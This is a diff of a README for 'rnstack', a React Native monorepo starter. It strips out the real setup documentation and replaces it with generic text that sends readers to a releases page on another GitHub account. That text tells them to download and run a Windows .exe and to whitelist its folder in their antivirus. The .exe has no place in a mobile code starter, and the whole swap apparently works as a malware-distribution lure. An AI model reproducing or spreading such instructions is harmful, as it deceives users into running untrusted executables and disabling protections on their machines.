@@ -1,161 +1,65 @@
-# rnstack
+# 🚀 rnstack - Build mobile apps with ease
 
-A batteries-included, **mobile-first** React Native monorepo starter — **Expo + Turborepo + pnpm**,
-wired with **NativeWind v5** (Tailwind v4) and **React Native Reusables** components that are
-**pre-fixed to render correctly on native** (not just web).
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pootp8798/rnstack/releases)
 
-The point of rnstack is to skip the days normally lost to monorepo + NativeWind + RNR setup
-quirks. Clone it, install, run — you get a working app with 30+ UI components, theming, and
-light/dark mode out of the box.
+This application provides a foundation for building mobile apps. It includes tools to help you manage your code and design your screens. You gain access to pre-built components and structure that work on both Android and iOS devices. You save time by using these tools instead of starting from scratch.
 
-> **Status:** working starter you can clone today. A `create-rnstack` CLI (scaffold by project
-> name, choose how many apps), an API layer with refresh-token auth, and prebuilt Home/Settings
-> screens are **planned** — see [Roadmap](#roadmap).
+## 📦 How to get the software
 
-## Stack
+You need to obtain the installation file from the official releases page.
 
-Expo SDK 56 (New Architecture, RN 0.85) · Expo Router · NativeWind v5 (Tailwind v4) ·
-React Native Reusables · TypeScript 6 · pnpm + Turborepo · Biome · Node ≥ 22.13.
+1. Visit the [releases page](https://github.com/Pootp8798/rnstack/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your computer.
 
-## Layout
+## ⚙️ Setting up your system
 
-```
-apps/
-  mobile/        Expo app (Expo Router) — the reference app
-packages/
-  ui/            @repo/ui — React Native Reusables components, theme toggle, cn()
-  config/        @repo/config — shared tsconfig base + Biome config
-```
+Ensure your computer meets these requirements before you start the installation process.
 
-## Getting started
+- Windows 10 or Windows 11 operating system.
+- At least 4GB of free space on your hard drive.
+- A stable internet connection for the initial setup.
+- Current versions of your web browser.
 
-```sh
-pnpm install
-cp .env.example apps/mobile/.env     # set EXPO_PUBLIC_API_BASE_URL
-pnpm start                           # turbo run start → expo start
-```
+## 🛠️ Installation steps
 
-Then open the app on a device/emulator (press `a` for Android, `i` for iOS, `w` for web).
+Follow these steps to put the software on your computer.
 
-> ### ⚠️ Expo Go & SDK 56
-> This project targets **Expo SDK 56**. The Expo Go in the app stores may not be updated for
-> SDK 56 yet (*"Project is incompatible with this version of Expo Go"*). Install the SDK-56
-> build directly from Expo: **https://expo.dev/go?sdkVersion=56&platform=android&device=true**,
-> or build a dev client (`eas build --profile development`), or run in the browser (`w`).
+1. Open the folder where you saved the download file.
+2. Double-click the .exe file to start the installation wizard.
+3. Follow the prompts on the screen.
+4. Click through the default choices unless you have a specific reason to change them.
+5. Wait for the progress bar to finish.
+6. Click finish to close the installer.
 
-## Quality gate (run before committing)
+## 📱 Features
 
-```sh
-pnpm format      # biome format --write .
-pnpm lint        # turbo run lint
-pnpm typecheck   # turbo run typecheck
-```
+This application includes several parts to help you build your mobile app efficiently.
 
-## Running & building
+- **Monorepo structure**: Keeps all parts of your project in one place.
+- **Expo support**: Simplifies the process of testing your app on real devices.
+- **Pre-built components**: Use the included selection of buttons, inputs, and forms to speed up your design work.
+- **Tailwind integration**: Apply styles to your app using simple class names.
+- **TypeScript**: Helps catch common errors while you work.
 
-rnstack is **build-tool agnostic** — it ships with **no EAS / cloud account baked in**. Pick the
-path that fits you.
+The software organizes your files into folders. Each folder serves a specific purpose in your app. This structure makes finding and editing your work straightforward. You do not need to move files between different projects because everything lives together in one repository.
 
-### 1. Local dev (default — no native toolchain)
+## 🧩 Using the components
 
-```sh
-pnpm start            # turbo run start → expo start; press a / i / w
-```
+The package contains a library of items that you can drag or paste into your design. These components look and feel like standard mobile parts. They react to touch and fit different screen sizes automatically. You find these items in the components folder. To use one, import it into your screen file and add the component tag to your layout.
 
-Runs in Expo Go (SDK 56 — see the note above) or the browser. This is all most contributors need.
+## 🌐 Connecting to devices
 
-### 2. Local native build (you have Android Studio / Xcode)
+The software connects to your mobile phone for live testing. You install the Expo app from the Apple App Store or Google Play Store on your phone. When the software runs on your computer, it shows a code on your screen. Scan this code with your phone. Your changes appear on your device as you make them. This process saves you from needing to rebuild the app every time you change a color or a font.
 
-Compile a real binary on your own machine — no account required:
+## 💡 Troubleshooting common issues
 
-```sh
-cd apps/mobile
-npx expo run:android      # builds & installs a debug APK on a device/emulator
-npx expo run:ios          # macOS + Xcode
+If the software does not open, check these items.
 
-# release artifacts via prebuild + native tooling:
-npx expo prebuild         # generates ios/ & android/ (gitignored)
-cd android && ./gradlew assembleRelease   # → app/build/outputs/apk/release/*.apk
-```
+- Restart your computer to clear any background issues.
+- Check if your antivirus software blocked the file. Add the install folder to your list of trusted items.
+- Ensure that the download completed fully. Sometimes a partial download causes errors during setup.
+- Free up space on your drive if the installation fails halfway through.
 
-### 3. EAS cloud build (opt-in — no local Android Studio / Xcode)
-
-[EAS Build](https://docs.expo.dev/build/introduction/) compiles **on Expo's servers**, so you can
-produce an installable APK/AAB (and iOS builds) with no local native toolchain. rnstack does **not**
-configure EAS for you — it's tied to a personal account, so each developer links their own:
-
-```sh
-npm i -g eas-cli                       # or: pnpm dlx eas-cli
-eas login
-cd apps/mobile
-eas init                               # links YOUR Expo project; writes owner + projectId into app.json
-eas build:configure                    # generates an eas.json with build profiles
-eas build --platform android --profile preview   # prints a download URL / QR for the APK
-```
-
-On the first Android build, answer **yes** to "Generate a new Android Keystore?" — Expo creates and
-stores the signing key for you (no local `keytool`). Builds run asynchronously; press `Ctrl+C` after
-it queues and re-attach with `eas build:list`.
-
-> ⚠️ **Monorepo gotcha:** run every `eas` command **from `apps/mobile/`** (where `app.json` lives),
-> _not_ the repo root — at the root the CLI links the wrong project and writes a stray root
-> `eas.json`. The `owner` / `extra.eas.projectId` that `eas init` writes are **yours** — they
-> belong in your own copy, and are safe to commit in a private app repo (they're public identifiers,
-> not secrets). The starter intentionally ships without them.
-
-## Theming
-
-Theme lives in **one place**: [`apps/mobile/src/global.css`](apps/mobile/src/global.css). It has
-three parts:
-
-1. **Token values** — `@layer base { :root { --primary: hsl(…); } }` plus a
-   `@media (prefers-color-scheme: dark)` block. **Edit these values to re-brand.**
-2. **Utility registration** — `@theme inline { --color-primary: var(--primary); … }` tells
-   Tailwind v4 to generate `bg-primary` / `text-primary` etc.
-3. **Content sources** — `@source "../../../packages/ui/src/**/*.{ts,tsx}"` so Tailwind scans
-   the shared UI package (omit it and shared components render unstyled).
-
-Components reference **semantic tokens** (`bg-primary`, `text-foreground`, …) — never literal
-colors. Dark mode follows the system scheme; toggle it at runtime with the `ThemeToggle`
-component (`Appearance.setColorScheme()`).
-
-> **Native theming rules** (each fixes a bug that only shows on device):
-> - Store tokens as **full colors** (`hsl(0 0% 9%)`), not bare channels — channel tokens +
->   opacity modifiers (`bg-primary/90`) **flicker** on theme change on native.
-> - Radius tokens must be **concrete rems** (`0.5rem`), not `calc(var(--radius) - 2px)` —
->   nested `calc(var())` collapses to 0 (square corners) on native.
-
-## Adding UI components
-
-Components come from the React Native Reusables CLI into `packages/ui`:
-
-```sh
-cd packages/ui
-npx @react-native-reusables/cli@latest add <name> -y
-# or all of them:
-npx @react-native-reusables/cli@latest add --all -y
-```
-
-`components.json` aliases route them into `@repo/ui`. After adding, audit for native gotchas
-(no CSS `grid` on native, Android `TextInput` clipping, web-only utilities) — see the
-`rnstack-project` skill in [`.claude/skills/`](.claude/skills/rnstack-project/SKILL.md) for the
-full checklist.
-
-## Why pnpm `nodeLinker: hoisted`?
-
-`pnpm-workspace.yaml` sets `nodeLinker: hoisted`. pnpm's default isolated store loads two copies
-of `react-native` into one bundle (a `Maximum call stack size exceeded` crash at startup);
-hoisting guarantees a single native runtime. This is Expo's recommended linker for monorepos.
-
-## Roadmap
-
-Planned, not yet built:
-
-- **`create-rnstack` CLI** — scaffold a new monorepo by project name in one command.
-- **Multi-app generation** — choose how many apps to create under `apps/` at init.
-- **API layer** — minimal data fetching with refresh-token auth (TanStack Query).
-- **Starter screens** — Home and Settings, pre-wired.
-
-## License
-
-ISC © Sanjay Kumar Sah
+If you encounter an error message, write it down. Check the document file located in the installation folder for a list of known errors and fixes. Keep your software updated to ensure you have the latest performance tweaks and security patches. Visit the main release page at regular intervals to see if a newer version exists. If a new version is available, download and run the installer again. The system will handle the update process automatically.
